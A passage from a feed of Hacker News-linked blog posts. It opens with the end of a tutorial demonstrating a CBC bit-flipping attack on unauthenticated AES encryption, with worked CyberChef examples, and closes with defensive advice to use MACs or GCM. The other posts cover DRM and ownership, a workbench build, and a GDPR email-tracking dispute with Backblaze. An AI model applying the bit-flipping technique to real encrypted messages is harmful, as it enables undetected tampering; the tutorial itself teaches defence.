Ciphertext: c7b1d96f0f520f33faaccfdc107f718aafe8892c3a29c76b0732a760a0f54f50
Plaintext: A cat's breakfast</code></pre>



<p>Of course, the attacker needs to have knowledge of the plaintext to make use of this attack. However, it’s extremely common for some or all of the message to be known. For example, when we visit most websites, the first part of the response will be “HTTP/1.1 200 OK”. If this was only protected by CBC encryption, we could change that to “HTTP/1.1 404 No”, changing the behaviour of the browser (here on <a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'00000000000000000006000000012400'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=ZGJkY2FkYWZjYjQ5NTJiNDE0OTBhODM4NDFhYzgxZGE">CyberChef</a>).</p>



<p>This doesn’t just impact the first block of data either. After the first block, instead of the IV, the previous ciphertext block is used in the exclusive OR operation. The attacker can modify the ciphertext and end up controlling the plaintext.</p>



<figure><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/2880px-CBC_decryption.svg.png" alt=""></figure>



<p>This comes at a cost though – the previous plaintext block will be totally corrupted as a result.</p>



<p>To illustrate this, we can encrypt a longer block of text (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Hex')&amp;input=VGhpcyBpcyBvdXIgd29ybGQgbm93Li4uIHRoZSB3b3JsZCBvZiB0aGUgZWxlY3Ryb24gYW5kIHRoZSBzd2l0Y2gsIHRoZQpiZWF1dHkgb2YgdGhlIGJhdWQuICBXZSBtYWtlIHVzZSBvZiBhIHNlcnZpY2UgYWxyZWFkeSBleGlzdGluZyB3aXRob3V0IHBheWluZwpmb3Igd2hhdCBjb3VsZCBiZSBkaXJ0LWNoZWFwIGlmIGl0IHdhc24ndCBydW4gYnkgcHJvZml0ZWVyaW5nIGdsdXR0b25zLCBhbmQKeW91IGNhbGwgdXMgY3JpbWluYWxzLiAgV2UgZXhwbG9yZS4uLiBhbmQgeW91IGNhbGwgdXMgY3JpbWluYWxzLiAgV2Ugc2VlawphZnRlciBrbm93bGVkZ2UuLi4gYW5kIHlvdSBjYWxsIHVzIGNyaW1pbmFscy4gIFdlIGV4aXN0IHdpdGhvdXQgc2tpbiBjb2xvciwKd2l0aG91dCBuYXRpb25hbGl0eSwgd2l0aG91dCByZWxpZ2lvdXMgYmlhcy4uLiBhbmQgeW91IGNhbGwgdXMgY3JpbWluYWxzLgpZb3UgYnVpbGQgYXRvbWljIGJvbWJzLCB5b3Ugd2FnZSB3YXJzLCB5b3UgbXVyZGVyLCBjaGVhdCwgYW5kIGxpZSB0byB1cwphbmQgdHJ5IHRvIG1ha2UgdXMgYmVsaWV2ZSBpdCdzIGZvciBvdXIgb3duIGdvb2QsIHlldCB3ZSdyZSB0aGUgY3JpbWluYWxzLg">here</a> on CyberChef).</p>



<p>Let’s change “baud” to “cats”. We need to locate the correct place in the ciphertext. AES (the encryption algorithm we are using) works in 16 byte blocks. The word “baud” is 85 characters in, so in the 6th block. We therefore want to modify the 5th block of ciphertext.</p>



<p>The exclusive OR is a bit more complex than last time – we now need to exclusive OR the ciphertext, the original text, and the desired text (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=MTkxNWRkOGU4ODBhN2JlZjgzN2Y1NDRlMzBlZGI5YmQxMjA3ZjMwMmRjM2NlZGQwY2I2NGJkY2JiOTk3YjVkYmM4M2RhNjU3MmZkNmMyMDVmOGQ4ZDI2NjQ5MmQyMDY3M2U0NGZhNzUwNGU2YzY0ZTI4M2E2NzI2MmIyYzMwNjM4OGI4ZjQyZTBmYjMxNzdmNmFmMTNlMWE0OGUxNDBmYTFhNDhmMThmZGYyNTc3MzgwMTUwYzM5ZDIwZTYyY2QzMzQ1ZDVmNTFiYzU4NDU2NGUwMzc5MTFkYTM1MTc3YjVkY2ZmOTkxZTRmYzg3NDFlYmJjMmRmM2I2YTc3OGViOTU3MTI1MmQxYTY0Yjk5NmRhOWFkMzFmNGE5MTI3NjM0M2FhMmU1ODQ1NjEyOTM1MDg0Zjc3Y2FhMmRiNDRiYTM5OTA5NzFkOTcwZWVlMjFlZDc3MjRiOWU3MDMwODEyZWI4N2U1ZDVmYmI3Y2M1MGE1NzYxNDBiN2I0NzhiYmZiNzU1MGU1MWU3ZmM0ZTg5ODExY2Y4MTg1OTJjNGY4ZWU3NGIyNTQ0Y2VhMGE4ZDdkZjM0OTE2YjIzYmMwOWIxYWJhN2IwN2ZlNDM0YWRjNjY5MzhhNzczMDU4MjNhYzdkMWJjZmEwOGNlOTRhYzc0MjUzNjdiODQwMGE5NGFlMDc0ZTFhY2NmZDkwYThjNDllYmYzNDNkMmU4YWQ5MmI2NDZlZDM0OTM4Yzg3NTI2MDUyYjA4ZjQ1MzgxMWQ4YTYyZjE2MzczMzkxZmE4YTBlZGIwZDJlZDBhYWQyNDViY2RlZmI1YTk0ZmRmZTBkNzA4YTMwYTVjZDVlZmI5ZjExNTk3MDU2NWFiMjg1ZGUyY2FlYWNkMTI3YzBhNzhkZDRjNmE4Y2U2NjRjYTFiOWI0YjI1ODk0MTYxMmUzMjgwOWEwNGRhYzIxODlkNGVkN2Q2ZDU4ZDcwMGNlODM5NTIzYzlmNTZiOGU2YWY1NGIzYjMxYjAxM2E4ODM4MjljM2Y0YTJhZmI3Mzc3OTFjNjBiN2E1N2I4NGNhOTgxYjFiM2E3N2M2YmI5ZWNiMzIwNzk3YmVhNzAyMDk5NGUwNzRmYmQ1NzM0MWQwMmVjYTY3ZWM1NWU5YzA1MmFkODA3NjUzMmUxZTI4MDJjMzc2YmRhMzg1NWIxYzYzY2FhNzRhZmI0YTRjNTFkMDNlNGZiMjEzY2ZiMTM4YjcxMTc1NzFhNTIzOTQzZGU1MWJiNzZiYTgwMzY2MDNkNDI2NmFmMzI3MGMyYjBhOTNjZDdlYzkyZmVjMjA0MTAyYjJkYWZlNDliMzUwZDFhNDk2NjVhYjE0MTFiMjhkZWQ1MmE5ZWE5NTA3ZWU5ZDljM2M0NzI4ZDBlNTk0YjEzM2VkMmRiOGUwYWQxZjBjZWM0NWRhYjJlN2Y1ODE5YTQyNWQ4NTY2ZWQ5MGQwYzI4MTMzZjlkZTM4ODQ4OTE3NjJhYTcxMzc2MjZmNmM2MTEzMDY4M2NkNWEzYmFjN2EzNTFkZDY0MjZjYzI2NzdjOGRjYWI0ZDMwZjg0OGNiZjYwOTBmMjM4MDM2ZTFlMzczMGZmODc4MTk2YWYyMjg4YWY5MTU5ZThkZA">here</a> on CyberChef). But change those 4 bytes, and we change the word “baud” to “cats”.</p>



<figure><img loading="lazy" width="1024" height="272" src="https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54-1024x272.png" alt="" srcset="https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54-1024x272.png 1024w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54-300x80.png 300w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54-768x204.png 768w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54-1536x407.png 1536w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-16.03.54.png 1682w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The only issue is, as expected, the previous block has been entirely corrupted. Whilst in this case, it’s made part of the message nonsensical, it frequently has no impact when carrying out attacks.</p>



<h3>But there are worse problems?</h3>



<p>The above issue allows an attacker to modify the plaintext without detection. This would be an issue in certain situations, such as lock/unlock messages to a door.</p>



<p>But not authenticating your encryption can lead to worse issues. A type of attack called <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">padding oracle attacks</a> can let an attacker obtain the plaintext by sending a large number of specially crafted packets.</p>



<p>Block ciphers only operated on fixed blocks. If the data is shorter than a block, it must be padded. There are a number of ways of doing this, such as appending the number of padding bytes (e.g. 0x02 0x02 or 0x05 0x05 0x05 0x05 0x05). The process of decryption may check this padding is correct or not, and respond differently in each case. </p>



<p>An attacker can exploit these differential responses to leak the plaintext. This can break the confidentiality of messages.</p>



<h3>What’s the solution to this?</h3>



<p>Encryption should always be authenticated. There are two common solutions to this:</p>



<ul><li>Add a <a href="https://en.wikipedia.org/wiki/Message_authentication_code">Message Authentication Code</a> (MAC). This is a keyed cryptographic checksum that provides authenticity and integrity.</li><li>Use an authenticated mode of operation such as <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Galois/Counter_(GCM)">GCM</a>.  </li></ul>



<p>Even with this advice, there are many pitfalls. Applying the authentication and encryption in the wrong order can lead to weaknesses; this is so common that it has been deemed the <a href="https://moxie.org/2011/12/13/the-cryptographic-doom-principle.html">Cryptographic Doom Principle</a>.</p>



<p>Generally, developers shouldn’t be working with cryptography at this level unless they are suitably skilled. That’s easy to say, harder to put into action. There is a big movement to make use of secure-by-default cryptographic libraries and APIs that provide developers with useful functions without giving them so much rope they can hang themselves.</p>



<p>There are scant few reasons for not authenticating encryption.</p>
			</div></div>]]>
            </description>
            <link>https://cybergibbons.com/reverse-engineering-2/why-is-unauthenticated-encryption-insecure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534619</guid>
            <pubDate>Sun, 20 Sep 2020 15:42:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ownership in the Age of DRM]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534616">thread link</a>) | @0goel0
<br/>
September 20, 2020 | https://goel.io/drm-ownership | <a href="https://web.archive.org/web/*/https://goel.io/drm-ownership">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>I’ve been thinking about what it means to own something. The definition that resonated the most with me is this<sup><a href="#footnote1">1</a></sup>:</p>

<blockquote>
  <p>You own what you can pass down</p>
</blockquote>

<p>It used to be common decades ago for people to pass down their property including media (vinyl records, disks, cassettes). You paid for hard assets that you owned.</p>

<p>Objectively, it’s easier to hold on to, and pass down, digital assets - you just have to change the “ownership” field in a database, or hand over a hard drive.</p>

<p>Instead, we got <a href="https://www.eff.org/issues/drm">Digital Rights Management</a>. DRM comprises of tools to lock down <em>who</em> has access to content, <em>where</em> it can be accessed, and for <em>how long</em>.</p>

<p>Simply put, if you buy an album on iTunes, it’s DRM protected. You cannot watch it on an Android device. Legally, you can’t even share it with your partner or family.</p>

<p>If you buy an ebook on Amazon, you merely get a license to read it. If Amazon decides they don’t like you as a customer and delete your account, you lose your book. Or, if your Kindle dies, you can’t just open the book on your computer or phone.</p>

<p>Using DRM, media companies can prosecute anyone that trying to transfer a Blu-Ray movie to their own computer.</p>

<p>That’s not ownership. In the digital age, we merely borrow when we “buy”.</p>

<p>To me, I only own media if:</p>

<ul>
  <li>I can store it on any device I own</li>
  <li>I can transfer it freely between devices I own</li>
  <li>I can consume it through any device<sup><a href="#footnote2">2</a></sup></li>
  <li>The seller cannot take it away from me</li>
  <li>I can transfer ownership freely</li>
</ul>

<p>Based on that criteria, the following are not ownership:</p>

<ul>
  <li>Netflix, Spotify, Pandora (is that still a thing) etc</li>
  <li>iTunes</li>
  <li><a href="https://www.salon.com/2013/03/01/do_you_truly_own_your_e_books/">Kindle books</a></li>
  <li>Blu-Ray disks (and some DVDs)</li>
  <li>Gaming console disks, or digital games (Steam)</li>
</ul>

<p>The only media marketplace I use that meets that criteria is <a href="https://bandcamp.com/">Bandcamp</a> where you buy music directly from artists and get to download it.</p>

<p><img src="https://goel.io/assets/img/posts/2020/2020-07-02-ownership-drm.png" alt="">
<em><a href="https://nadasurf.bandcamp.com/">Nada Surf</a> is an awesome alt-rock band!</em></p>

<p>I prefer straight up MP3 files. That’s what doing digital media the right way looks like.</p>

<p>Don’t get me wrong. For creators piracy is a big problem. Some common reasons for piracy and illegal media sharing are:</p>

<ul>
  <li>Not available in consumers’ region</li>
  <li>Delayed release in consumers’ region</li>
  <li>Not convenient to purchase</li>
  <li>Not convenient to consume the media (DRM)</li>
</ul>

<p>However, DRM is not a solution. It’s a duct tape on a crumbling building.</p>

<p>I do recognize that creators have bills and should be paid fairly for their work. I will continue to pay for my media (that’s both “bought” and <em>bought</em>) as well support creators directly (Patreon etc).</p>

<hr>

<p><a name="footnote1">1</a>: I did not come up with this, but I also can’t find out where I read/watched/listened this idea. If you do, let me know.</p>

<p><a name="footnote2">2</a>: I don’t necessarily mean that if the latest video or audio codec is not supported on Android for example, then the media encoded in that codec breaks my criterion. However the codec spec must be open and not proprietary for alternative implementations.</p>

  </div></div>]]>
            </description>
            <link>https://goel.io/drm-ownership</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534616</guid>
            <pubDate>Sun, 20 Sep 2020 15:42:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing an Overkill workbench for home office Part 3]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534595">thread link</a>) | @gcds
<br/>
September 20, 2020 | https://www.techprowd.com/home-office-project-overkill-workbench-series-part-3-delivery-of-materials-and-a-few-things-builds/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/home-office-project-overkill-workbench-series-part-3-delivery-of-materials-and-a-few-things-builds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Today is finally the day the materials were delivered to my home.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-83.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-83.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-83.png 1000w, https://www.techprowd.com/content/images/2020/09/image-83.png 1024w"></figure><p>Unloading was pretty quick as it was 3 (including me) unloading it near the staircases to my apartment on the 4th floor.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3140.jpeg" width="3024" height="4032" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3140.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3140.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3140.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3140.jpeg 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3141.jpeg" width="3024" height="4032" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3141.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3141.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3141.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3141.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>The funniest thing about all this is that my apartment on the 4th floor has no elevator, pretty unusual for a Japanese apartment complex. So I had to carry on everything by myself to the 4th floor.</p><p>One of the optimizations I have done is to pack everything in small batches with packing tape to be solid peace. Much easier that way.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3142.jpeg" width="3024" height="4032" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3142.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3142.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3142.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3142.jpeg 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3144.jpeg" width="3024" height="4032" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3144.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3144.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3144.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3144.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Two hours and a half later, 21 journeys up the stairs, I got everything delivered to the apartment. According to Apple, I have burned 2500cal while doing this by myself.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3145.jpeg" width="4032" height="3024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3145.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3145.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3145.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3145.jpeg 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/IMG_3148.jpeg" width="4032" height="3024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/IMG_3148.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/IMG_3148.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/IMG_3148.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/IMG_3148.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div></div></figure><h2 id="first-small-project-diy-sawhorse">First small project: DIY Sawhorse</h2><p>As I will have to cut many planks to size, I decided to build sawhorse myself instead of buying one, 3 x 2x4 vs. 2-3k¥ bought one from a home improvement store. This is my first time trying to make something like this, but I had seen plenty of these built when I was a kid looking around construction workers.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-84.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-84.png 600w, https://www.techprowd.com/content/images/2020/09/image-84.png 768w" sizes="(min-width: 720px) 720px"></figure><p>3 x 2x4 1820mm planks to start with, split all 3 of them in the middle to two 910mm parts.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-85.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-85.png 600w, https://www.techprowd.com/content/images/2020/09/image-85.png 768w" sizes="(min-width: 720px) 720px"></figure><p>I got this angle ruler from a local store. According to the internet, it's the most popular product among workers. Makes perfect straight lines.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-86.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-86.png 600w, https://www.techprowd.com/content/images/2020/09/image-86.png 768w" sizes="(min-width: 720px) 720px"></figure><p>For cutting, I am going to use Japanese. hand saw as I do not want to use a loud circular saw in the apartment (neighbors would not be happy about it)</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-87.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-87.png 600w, https://www.techprowd.com/content/images/2020/09/image-87.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-88.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-88.png 600w, https://www.techprowd.com/content/images/2020/09/image-88.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-89.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-89.png 600w, https://www.techprowd.com/content/images/2020/09/image-89.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-90.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-90.png 600w, https://www.techprowd.com/content/images/2020/09/image-90.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Repeat this on all three pieces.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-91.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-91.png 600w, https://www.techprowd.com/content/images/2020/09/image-91.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Now to join them together to form X shape</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-92.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-92.png 600w, https://www.techprowd.com/content/images/2020/09/image-92.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-93.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-93.png 600w, https://www.techprowd.com/content/images/2020/09/image-93.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Then use two left pieces to join them together horizontally.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-94.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-94.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-94.png 1000w, https://www.techprowd.com/content/images/2020/09/image-94.png 1024w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-first-part-of-works-for-workbench-columns-feets">The first part of works for workbench: Columns/Feets</h2><p>As I still have an hour before it gets dark, I decided to cut and make columns for the workbench.</p><p>Measure length; I am going to use a 230cm length for the rear columns.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-95.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-95.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-95.png 1000w, https://www.techprowd.com/content/images/2020/09/image-95.png 1024w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-96.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-96.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-96.png 1000w, https://www.techprowd.com/content/images/2020/09/image-96.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>Use angle ruler to make perfect straight lines and then cut to size.</p><p>I have not mentioned or included in the CAD plans the metal levelers/feets I am going to use. Those come with screw in holder with nut and leveler itselfs.</p><p>As the holder has a pimple, I will use a Forstner bit to make a pimple hole. Then use a wood drill bit to make a hole for the leveler threaded rod.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-97.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-97.png 600w, https://www.techprowd.com/content/images/2020/09/image-97.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-98.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-98.png 600w, https://www.techprowd.com/content/images/2020/09/image-98.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-99.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-99.png 600w, https://www.techprowd.com/content/images/2020/09/image-99.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-100.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-100.png 600w, https://www.techprowd.com/content/images/2020/09/image-100.png 768w" sizes="(min-width: 720px) 720px"></figure><p>I am going to make around 70mm height which would give me plenty of space to adjust the leveler is 100mm long, smallest height is 40mm together with table top and front feets it should be around 730mm height.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-101.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-101.png 600w, https://www.techprowd.com/content/images/2020/09/image-101.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Now just repeat it all for all elevel columns</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-102.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-102.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-102.png 1000w, https://www.techprowd.com/content/images/2020/09/image-102.png 1024w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-103.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-103.png 600w, https://www.techprowd.com/content/images/2020/09/image-103.png 768w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-104.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-104.png 600w, https://www.techprowd.com/content/images/2020/09/image-104.png 768w" sizes="(min-width: 720px) 720px"></figure><p>After placing columns in the room it looks like I am going to frame the room 😅</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-105.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-105.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-105.png 1000w, https://www.techprowd.com/content/images/2020/09/image-105.png 1024w" sizes="(min-width: 720px) 720px"></figure><p>I am going to continue working tomorrow morning on the workbench.</p><p>As I have promised, I will try to stream the whole process. I managed to get my GoPro to live stream to OBS (but it will have some delay). So if hardware did not let me down tomorrow morning, I would be live on my <a href="https://www.twitch.tv/techprowd">twitch channel</a>.</p><p>I plan to start streaming tomorrow at 10 AM (JST) time.</p><ul><li>AEST: 11:00 AM</li><li>GMT: 01:00 AM</li><li>EET: 04:00 AM</li><li>PST 06:00 PM</li><li>EST: 09:00 PM</li><li>CST: 08:00 PM</li></ul><!--kg-card-begin: html--><iframe src="https://player.twitch.tv/?channel=techprowd&amp;parent=www.techprowd.com&amp;muted=true" height="394" width="700" frameborder="0" scrolling="no" allowfullscreen="true">
</iframe><!--kg-card-end: html--><p>Don't forget to subscribe to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://www.techprowd.com/home-office-project-overkill-workbench-series-part-3-delivery-of-materials-and-a-few-things-builds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534595</guid>
            <pubDate>Sun, 20 Sep 2020 15:37:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is Backblaze tracking me?]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 10 (<a href="https://news.ycombinator.com/item?id=24534572">thread link</a>) | @gingerlime
<br/>
September 20, 2020 | https://blog.gingerlime.com/2020/why-is-backblaze-tracking-me/ | <a href="https://web.archive.org/web/*/https://blog.gingerlime.com/2020/why-is-backblaze-tracking-me/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="content">

<div>
	<div id="primary">
		<main id="main" role="main">

			
<article id="post-2612">
		<!-- .entry-header -->

	
	<div>
		
<p>This is a follow-up to my previous post: <a href="https://blog.gingerlime.com/2020/hey-com-is-onto-something-with-its-tracking-pixel-blocker/">hey.com is onto something with its tracking-pixel blocker</a>. I mentioned contacting Backblaze about their email tracking there. </p>



<div><figure><img loading="lazy" width="630" height="396" src="https://blog.gingerlime.com/assets/Screenshot-2020-06-21-at-08.17.12.png" alt="" srcset="https://blog.gingerlime.com/assets/Screenshot-2020-06-21-at-08.17.12.png 630w, https://blog.gingerlime.com/assets/Screenshot-2020-06-21-at-08.17.12-300x189.png 300w" sizes="(max-width: 630px) 100vw, 630px"></figure></div>



<p>I didn’t think too much of it at the time, and honestly (or naively?) was expecting some kind of a “Oh, yes, you’re right, there’s no need to track those emails”… But it didn’t unfold in quite the same way.</p>



<h2>TL;DR</h2>



<p>This is my own interpretation, obviously. Backblaze seems to think that tracking emails is totally fine, even under the GDPR. They’re not going to stop doing it until further notice.</p>



<h2>Blow by blow details</h2>



<p>Rather than describing the conversation, I think for the sake of transparency it’s easier to just quote the entire thread. So here goes, in chronological order… I removed names and identifying details to protect the privacy of the people involved, but the text was otherwise left exactly as-is. Some of the interaction is fairly mundane, but you can skip to the end to see how it was resolved (or rather, not resolved).</p>



<h2>Initial conversations with Backblaze support</h2>



<figure><div>Jun 20, 2020<p>Hi Backblaze,</p><p>I started forwarding my emails to hey.com and they spotted the use of tracking pixels on your emails. I (and I believe many other customers, especially in Europe) would appreciate not being tracked without explicit consent (and I didn’t give such consent).</p><p>Respectfully,<br>Yoav</p></div></figure>



<figure><div>Jun 21, 2020<p>Hello,&nbsp;</p><p>Thank you for writing in. We do use Sendgrid to send system emails, and only collect if an email was delivered, opened, and how many times it was opened. We do not gather other information beyond that.&nbsp;</p><p>Please note that the terms can be found when you click on the link below and by using the service agree to our terms:<br>–&nbsp;<a href="http://www.backblaze.com/terms.html" rel="noreferrer noopener" target="_blank">http://www.backblaze.com/terms.html</a></p><p>All the best,<br>A.<br>Support Technician</p></div></figure>



<figure><div>Jun 21, 2020<p>Hi A.,</p><p>Thanks for getting back to me. Your terms page doesn’t actually say anything about tracking my email opens etc. Or at least I couldn’t find anything.</p><p>Regardless, I don’t believe this is permissible without explicit consent under the GDPR. I also don’t quite understand why you would even want to track those alert emails?</p><p>Sincerely,<br>Yoav</p></div></figure>



<figure></figure>



<figure><div>Jun 22, 2020<p>Hi A.,</p><p>Perhaps the timestamps on their own aren’t considered personal data, but combined with my email address, IP, browser info etc, I’m pretty sure falls under personal data as defined by the GDPR. According to two articles I was able to find, this kind of tracking isn’t permissible by GDPR and the e-Privacy directive without explicit consent, which was not requested, nor given by me.</p><p><a href="https://www.lexology.com/library/detail.aspx?g=ac233fd4-cd49-45a7-9494-6085512c0312" rel="noreferrer noopener" target="_blank">https://www.lexology.com/library/detail.aspx?g=ac233fd4-cd49-45a7-9494-6085512c0312</a><br><a href="https://www.pipedrive.com/en/blog/gdpr-email-tracking" rel="noreferrer noopener" target="_blank">https://www.pipedrive.com/en/blog/gdpr-email-tracking</a></p><p>The links you provided so far do not appear to address this issue. Would appreciate if you could look into this more seriously.</p><p>Sincerely,<br>Yoav</p></div></figure>



